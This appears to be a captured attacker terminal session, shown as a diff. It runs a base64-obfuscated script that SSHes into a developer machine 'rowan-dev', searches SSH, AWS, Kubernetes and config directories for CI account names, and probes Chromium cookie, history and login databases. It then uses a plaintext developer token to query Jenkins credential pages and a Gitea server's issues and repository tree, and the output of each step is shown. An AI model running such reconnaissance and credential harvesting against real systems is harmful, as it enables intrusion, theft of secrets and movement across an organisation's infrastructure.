@@ -1,0 +1,104 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r31.sh <<'B64EOF'
+> c2V0ICtlCkNBPS9ob21lL3Jvd2FuLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkNSRUQ9J3Jvd2FuLml0bzpma19kZXZlbG9wZXJfeVVXVEtTcXJjMTZ5M0s1XzVEZlE3cWFjZnQ5Yi05eG8nClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCnJ1bigpeyBlY2hvICI9PT09PSAkMSA9PT09PSI7ICRTICIkMSIgMj4mMTsgZWNobzsgfQpydW4gJ2dyZXAgLVJpbCAiYnVpbGRvcHNcfGJ1aWxkX29wZXJhdGlvbnNcfGJ1aWxkLW9wZXJhdGlvbnNcfGNpLWF1dG9tYXRpb25cfHJ1bm5lci1jb21tYW5kXHxydW5uZXItb3BlcmF0aW9ucyIgfi8uY29uZmlnIH4vLmxvY2FsIH4vLm5wbSB+Ly5zc2ggfi8ua3ViZSB+Ly5hd3MgMj4vZGV2L251bGwgfCBoZWFkIC00MDsgZWNobyAtLS07IGdyZXAgLVJpbiAiYnVpbGRvcHNcfGJ1aWxkX29wZXJhdGlvbnNcfGJ1aWxkLW9wZXJhdGlvbnNcfGNpLWF1dG9tYXRpb25cfHJ1bm5lci1jb21tYW5kXHxydW5uZXItb3BlcmF0aW9ucyIgfi8uY29uZmlnIH4vLmxvY2FsIH4vLnNzaCB+Ly5rdWJlIH4vLmF3cyAyPi9kZXYvbnVsbCB8IGhlYWQgLTYwJwpydW4gJ2xzIC1sYSB+Ly5jb25maWcvY2hyb21pdW0vRGVmYXVsdCAyPi9kZXYvbnVsbCB8IGhlYWQgLTMwOyB3aGljaCBzcWxpdGUzOyBmb3IgZiBpbiAiSGlzdG9yeSIgIkxvZ2luIERhdGEiICJDb29raWVzIjsgZG8gZWNobyAiIyMjICRmIjsgWyAtZiB+Ly5jb25maWcvY2hyb21pdW0vRGVmYXVsdC8iJGYiIF0gJiYgc3FsaXRlMyB+Ly5jb25maWcvY2hyb21pdW0vRGVmYXVsdC8iJGYiICIudGFibGVzIiAyPiYxIHwgaGVhZCAtMzsgZG9uZScKcnVuICdmb3IgVSBpbiAvY3JlZGVudGlhbHMvIC91c2VyL3Jvd2FuLml0by9jcmVkZW50aWFscy8gL2FzeW5jaFBlb3BsZS9hcGkvanNvbiAvdXNlci9jaS1hdXRvbWF0aW9uL2FwaS9qc29uIC91c2VyL2J1aWxkLW9wZXJhdGlvbnMvYXBpL2pzb24gL21lL2FwaS9qc29uOyBkbyBlY2hvICIjIyMgJFUiOyBjdXJsIC1zUyAtbSAxMCAtZyAtLWNhY2VydCAnIiRDQSInIC11ICciJENSRUQiJyAiaHR0cHM6Ly9jaS5rZXBsZXJvcHMudGVzdCRVIiB8IGhlYWQgLWMgMTUwMDsgZWNobzsgZG9uZScKcnVuICdmb3IgUiBpbiBmaWVsZGxpbmstY29ubmVjdG9yIGNvbm5lY3Rvci1hcmNoaXZlIHBvbGljeS1jb21waWxlciByZWxlYXNlLXNpZ25lci1oaXN0b3J5OyBkbyBlY2hvICIjIyMgSVNTVUVTICRSIjsgY3VybCAtc1MgLW0gMTAgLWcgLS1jYWNlcnQgJyIkQ0EiJyAtdSAnIiRDUkVEIicgImh0dHBzOi8vc291cmNlLmtlcGxlcm9wcy50ZXN0L2FwaS92MS9yZXBvcy9maWVsZGtlc3QvJFIvaXNzdWVzP3N0YXRlPWFsbCZsaW1pdD0yMCIgfCBoZWFkIC1jIDMwMDA7IGVjaG87IGRvbmUnCnJ1biAnZWNobyAiIyMjIHBvbGljeS1jb21waWxlciB0cmVlIjsgY3VybCAtc1MgLW0gMTAgLWcgLS1jYWNlcnQgJyIkQ0EiJyAtdSAnIiRDUkVEIicgImh0dHBzOi8vc291cmNlLmtlcGxlcm9wcy50ZXN0L2FwaS92MS9yZXBvcy9maWVsZGtlc3QvcG9saWN5LWNvbXBpbGVyL2dpdC90cmVlcy9tYWluP3JlY3Vyc2l2ZT0xIiB8IHB5dGhvbjMgLWMgImltcG9ydCBzeXMsanNvbjtkPWpzb24ubG9hZChzeXMuc3RkaW4pO3ByaW50KGNocigxMCkuam9pbih4W1wicGF0aFwiXSBmb3IgeCBpbiBkLmdldChcInRyZWVcIixbXSkpKSIgMj4mMSB8IGhlYWQgLTgwJwo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r31.sh; bash /tmp/r31.sh; echo DONEMARK_1795200978723$((6*7))
+===== grep -Ril "buildops\|build_operations\|build-operations\|ci-automation\|runner-command\|runner-operations" ~/.config ~/.local ~/.npm ~/.ssh ~/.kube ~/.aws 2>/dev/null | head -40; echo ---; grep -Rin "buildops\|build_operations\|build-operations\|ci-automation\|runner-command\|runner-operations" ~/.config ~/.local ~/.ssh ~/.kube ~/.aws 2>/dev/null | head -60 =====
+---
+
+===== ls -la ~/.config/chromium/Default 2>/dev/null | head -30; which sqlite3; for f in "History" "Login Data" "Cookies"; do echo "### $f"; [ -f ~/.config/chromium/Default/"$f" ] && sqlite3 ~/.config/chromium/Default/"$f" ".tables" 2>&1 | head -3; done =====
+total 52
+drwx------ 2 rowan rowan  4096 Nov 19 07:11 .
+drwx------ 3 rowan rowan  4096 Nov 19 07:11 ..
+-rw------- 1 rowan rowan 20480 Nov 19 07:11 Cookies
+-rw------- 1 rowan rowan 20480 Sep 18 11:00 History
+-rw------- 1 rowan rowan   202 Sep 18 11:00 Preferences
+/usr/bin/sqlite3
+### History
+meta    urls    visits
+### Login Data
+### Cookies
+cookies  meta   
+
+===== for U in /credentials/ /user/rowan.ito/credentials/ /asynchPeople/api/json /user/ci-automation/api/json /user/build-operations/api/json /me/api/json; do echo "### $U"; curl -sS -m 10 -g --cacert /home/rowan/.local/share/keplerops/ca.crt -u rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo "https://ci.keplerops.test$U" | head -c 1500; echo; done =====
+### /credentials/
+
+  
+  <!DOCTYPE html><html data-disable-sticky="false"><head resURL="/static/82d8fbbd" data-rooturl="" data-resurl="/static/82d8fbbd" data-extensions-available="true" data-unit-test="false" data-imagesurl="/static/82d8fbbd/images" data-crumb-header="Jenkins-Crumb" data-crumb-value="1712e86e5ead591ebf892b11675fcaf0601dd1dd340ccbce9f342e047e3004c6">
+    
+    
+
+    <title>Jenkins</title><link rel="stylesheet" href="/static/82d8fbbd/jsbundles/styles.css" type="text/css"><link rel="stylesheet" href="/static/82d8fbbd/css/responsive-grid.css" type="text/css"><link rel="icon" href="/static/82d8fbbd/favicon.svg" type="image/svg+xml"><link sizes="any" rel="alternate icon" href="/static/82d8fbbd/favicon.ico"><link sizes="180x180" rel="apple-touch-icon" href="/static/82d8fbbd/apple-touch-icon.png"><link color="#191717" rel="mask-icon" href="/static/82d8fbbd/mask-icon.svg"><script src="/static/82d8fbbd/scripts/behavior.js" type="text/javascript"></script><script src='/adjuncts/82d8fbbd/org/kohsuke/stapler/bind.js' type='text/javascript'></script><script src="/static/82d8fbbd/scripts/hudson-behavior.js" type="text/javascript"></script><script src="/static/82d8fbbd/scripts/sortable.js" type="text/javascript"></script><link rel="search" href="/opensearch.xml" type="application/opensearchdescription+xml" title="Jenkins"><meta name="ROBOTS" content="INDEX,NOFOLLOW"><meta name="viewport" content="width=device-width, initial-scale=1"><script src='/adjuncts/82d8fbbd/org/jenkinsci/plugins/scriptsecurl: (23) Failure writing output to destination
+
+### /user/rowan.ito/credentials/
+
+  
+  <!DOCTYPE html><html data-disable-sticky="false"><head resURL="/static/82d8fbbd" data-rooturl="" data-resurl="/static/82d8fbbd" data-extensions-available="true" data-unit-test="false" data-imagesurl="/static/82d8fbbd/images" data-crumb-header="Jenkins-Crumb" data-crumb-value="12acad4df92d4638140c7bb8d1f5f464206daac3c788102333d29f966e07c760">
+    
+    
+
+    <title>User: rowan.ito » Credentials - Jenkins</title><link rel="stylesheet" href="/static/82d8fbbd/jsbundles/styles.css" type="text/css"><link rel="stylesheet" href="/static/82d8fbbd/css/responsive-grid.css" type="text/css"><link rel="icon" href="/static/82d8fbbd/favicon.svg" type="image/svg+xml"><link sizes="any" rel="alternate icon" href="/static/82d8fbbd/favicon.ico"><link sizes="180x180" rel="apple-touch-icon" href="/static/82d8fbbd/apple-touch-icon.png"><link color="#191717" rel="mask-icon" href="/static/82d8fbbd/mask-icon.svg"><script src="/static/82d8fbbd/scripts/behavior.js" type="text/javascript"></script><script src='/adjuncts/82d8fbbd/org/kohsuke/stapler/bind.js' type='text/javascript'></script><script src="/static/82d8fbbd/scripts/hudson-behavior.js" type="text/javascript"></script><script src="/static/82d8fbbd/scripts/sortable.js" type="text/javascript"></script><link rel="search" href="/opensearch.xml" type="application/opensearchdescription+xml" title="Jenkins"><meta name="ROBOTS" content="INDEX,NOFOLLOW"><meta name="viewport" content="width=device-width, initial-scale=1"><script src='/adjuncts/82d8fbcurl: (23) Failure writing output to destination
+
+### /asynchPeople/api/json
+
+    
+    
+  
+  <!DOCTYPE html><html data-disable-sticky="false"><head resURL="/static/82d8fbbd" data-rooturl="" data-resurl="/static/82d8fbbd" data-extensions-available="true" data-unit-test="false" data-imagesurl="/static/82d8fbbd/images" data-crumb-header="Jenkins-Crumb" data-crumb-value="8f75ac156948d5db9931ebf0edbdfba3992e03d29a94defb34b83d9491763d08">
+    
+    
+
+    <title>Not Found - Jenkins</title><link rel="stylesheet" href="/static/82d8fbbd/jsbundles/styles.css" type="text/css"><link rel="stylesheet" href="/static/82d8fbbd/css/responsive-grid.css" type="text/css"><link rel="icon" href="/static/82d8fbbd/favicon.svg" type="image/svg+xml"><link sizes="any" rel="alternate icon" href="/static/82d8fbbd/favicon.ico"><link sizes="180x180" rel="apple-touch-icon" href="/static/82d8fbbd/apple-touch-icon.png"><link color="#191717" rel="mask-icon" href="/static/82d8fbbd/mask-icon.svg"><script src="/static/82d8fbbd/scripts/behavior.js" type="text/javascript"></script><script src='/adjuncts/82d8fbbd/org/kohsuke/stapler/bind.js' type='text/javascript'></script><script src="/static/82d8fbbd/scripts/hudson-behavior.js" type="text/javascript"></script><script src="/static/82d8fbbd/scripts/sortable.js" type="text/javascript"></script><link rel="search" href="/opensearch.xml" type="application/opensearchdescription+xml" title="Jenkins"><meta name="ROBOTS" content="INDEX,NOFOLLOW"><meta name="viewport" content="width=device-width, initial-scale=1"><script src='/adjuncts/82d8fbbd/org/jenkcurl: (23) Failed writing body
+
+### /user/ci-automation/api/json
+{"_class":"hudson.model.User","absoluteUrl":"https://ci.keplerops.test/user/ci-automation","description":null,"fullName":"ci-automation","id":"ci-automation","property":[]}
+### /user/build-operations/api/json
+
+    
+    
+  
+  <!DOCTYPE html><html data-disable-sticky="false"><head resURL="/static/82d8fbbd" data-rooturl="" data-resurl="/static/82d8fbbd" data-extensions-available="true" data-unit-test="false" data-imagesurl="/static/82d8fbbd/images" data-crumb-header="Jenkins-Crumb" data-crumb-value="f4e9447baa94d15153f870efee0345adb89cfaca481b91169a42da0a523f9661">
+    
+    
+
+    <title>Not Found - Jenkins</title><link rel="stylesheet" href="/static/82d8fbbd/jsbundles/styles.css" type="text/css"><link rel="stylesheet" href="/static/82d8fbbd/css/responsive-grid.css" type="text/css"><link rel="icon" href="/static/82d8fbbd/favicon.svg" type="image/svg+xml"><link sizes="any" rel="alternate icon" href="/static/82d8fbbd/favicon.ico"><link sizes="180x180" rel="apple-touch-icon" href="/static/82d8fbbd/apple-touch-icon.png"><link color="#191717" rel="mask-icon" href="/static/82d8fbbd/mask-icon.svg"><script src="/static/82d8fbbd/scripts/behavior.js" type="text/javascript"></script><script src='/adjuncts/82d8fbbd/org/kohsuke/stapler/bind.js' type='text/javascript'></script><script src="/static/82d8fbbd/scripts/hudson-behavior.js" type="text/javascript"></script><script src="/static/82d8fbbd/scripts/sortable.js" type="text/javascript"></script><link rel="search" href="/opensearch.xml" type="application/opensearchdescription+xml" title="Jenkins"><meta name="ROBOTS" content="INDEX,NOFOLLOW"><meta name="viewport" content="width=device-width, initial-scale=1"><script src='/adjuncts/82d8fbbd/org/jenkcurl: (23) Failure writing output to destination
+
+### /me/api/json
+{"_class":"hudson.model.User","absoluteUrl":"https://ci.keplerops.test/user/rowan.ito","description":null,"fullName":"rowan.ito","id":"rowan.ito","property":[{"_class":"jenkins.security.ApiTokenProperty"},{"_class":"jenkins.console.ConsoleUrlProviderUserProperty"},{"_class":"com.cloudbees.plugins.credentials.UserCredentialsProvider$UserCredentialsProperty"},{"_class":"jenkins.views.ViewsTabBarUserProperty"},{"_class":"hudson.tasks.Mailer$UserProperty","address":null},{"_class":"hudson.model.MyViewsProperty"},{"_class":"org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty"},{"_class":"hudson.model.PaneStatusProperties"},{"_class":"jenkins.security.seed.UserSeedProperty"},{"_class":"hudson.search.UserSearchProperty","insensitiveSearch":true},{"_class":"hudson.model.TimeZoneProperty"},{"_class":"jenkins.model.experimentalflags.UserExperimentalFlagsProperty"},{"_class":"hudson.security.HudsonPrivateSecurityRealm$Details"}]}
+
+===== for R in fieldlink-connector connector-archive policy-compiler release-signer-history; do echo "### ISSUES $R"; curl -sS -m 10 -g --cacert /home/rowan/.local/share/keplerops/ca.crt -u rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo "https://source.keplerops.test/api/v1/repos/fieldkest/$R/issues?state=all&limit=20" | head -c 3000; echo; done =====
+### ISSUES fieldlink-connector
+[{"id":4,"url":"https://source.keplerops.test/api/v1/repos/fieldkest/fieldlink-connector/issues/4","html_url":"https://source.keplerops.test/fieldkest/fieldlink-connector/issues/4","number":4,"user":{"id":1,"login":"fieldlink-bootstrap","login_name":"","source_id":0,"full_name":"","email":"source-admin@fieldkest.test","avatar_url":"https://source.keplerops.test/avatars/7bfc283fbc08e22eeb3a3af1326c544c","html_url":"https://source.keplerops.test/fieldlink-bootstrap","language":"","is_admin":false,"last_login":"0001-01-01T00:00:00Z","created":"2026-11-19T07:07:33Z","restricted":false,"active":false,"prohibit_login":false,"location":"","website":"","description":"","visibility":"public","followers_count":0,"following_count":0,"starred_repos_count":0,"username":"fieldlink-bootstrap"},"original_author":"","original_author_id":0,"title":"North Quay rehearsal summary","body":"The rehearsal completed with the expected connector revision and no customer-side retry.","ref":"","assets":[],"labels":[],"milestone":null,"assignee":null,"assignees":null,"state":"open","is_locked":false,"comments":0,"created_at":"2026-11-19T07:07:40Z","updated_at":"2026-11-19T07:07:40Z","closed_at":null,"due_date":null,"time_estimate":0,"pull_request":null,"repository":{"id":1,"name":"fieldlink-connector","owner":"fieldkest","full_name":"fieldkest/fieldlink-connector"},"pin_order":0},{"id":3,"url":"https://source.keplerops.test/api/v1/repos/fieldkest/fieldlink-connector/issues/3","html_url":"https://source.keplerops.test/fieldkest/fieldlink-connector/issues/3","number":3,"user":{"id":1,"login":"fieldlink-bootstrap","login_name":"","source_id":0,"full_name":"","email":"source-admin@fieldkest.test","avatar_url":"https://source.keplerops.test/avatars/7bfc283fbc08e22eeb3a3af1326c544c","html_url":"https://source.keplerops.test/fieldlink-bootstrap","language":"","is_admin":false,"last_login":"0001-01-01T00:00:00Z","created":"2026-11-19T07:07:33Z","restricted":false,"active":false,"prohibit_login":false,"location":"","website":"","description":"","visibility":"public","followers_count":0,"following_count":0,"starred_repos_count":0,"username":"fieldlink-bootstrap"},"original_author":"","original_author_id":0,"title":"Document package channel ownership","body":"Release Operations owns the stable package channel. Customer Support owns the handover record.","ref":"","assets":[],"labels":[],"milestone":null,"assignee":null,"assignees":null,"state":"open","is_locked":false,"comments":0,"created_at":"2026-11-19T07:07:40Z","updated_at":"2026-11-19T07:07:40Z","closed_at":null,"due_date":null,"time_estimate":0,"pull_request":null,"repository":{"id":1,"name":"fieldlink-connector","owner":"fieldkest","full_name":"fieldkest/fieldlink-connector"},"pin_order":0},{"id":2,"url":"https://source.keplerops.test/api/v1/repos/fieldkest/fieldlink-connector/issues/2","html_url":"https://source.keplerops.test/fieldkest/fieldlink-connector/issues/2","number":2,"user":{"id":1,"login":"fieldlink-bootstrap","login_
+### ISSUES connector-archive
+[]
+
+### ISSUES policy-compiler
+[]
+
+### ISSUES release-signer-history
+[]
+
+
+===== echo "### policy-compiler tree"; curl -sS -m 10 -g --cacert /home/rowan/.local/share/keplerops/ca.crt -u rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo "https://source.keplerops.test/api/v1/repos/fieldkest/policy-compiler/git/trees/main?recursive=1" | python3 -c "import sys,json;d=json.load(sys.stdin);print(chr(10).join(x[\"path\"] for x in d.get(\"tree\",[])))" 2>&1 | head -80 =====
+### policy-compiler tree
+README.md
+api
+api/accept-template.json
+api/condition-set-template.json
+api/corpus-check-template.json
+api/fragment-assembly-guide.json
+api/opcode-model-template.json
+api/program-model-template.json
+bin
+bin/fieldkest-policyc
+corpus
+corpus/policy-corpus-2026-09-r4.json
+examples
+examples/rejected-incomplete.env
+maps
+maps/fieldkest-policyc-2.6.4.map
+
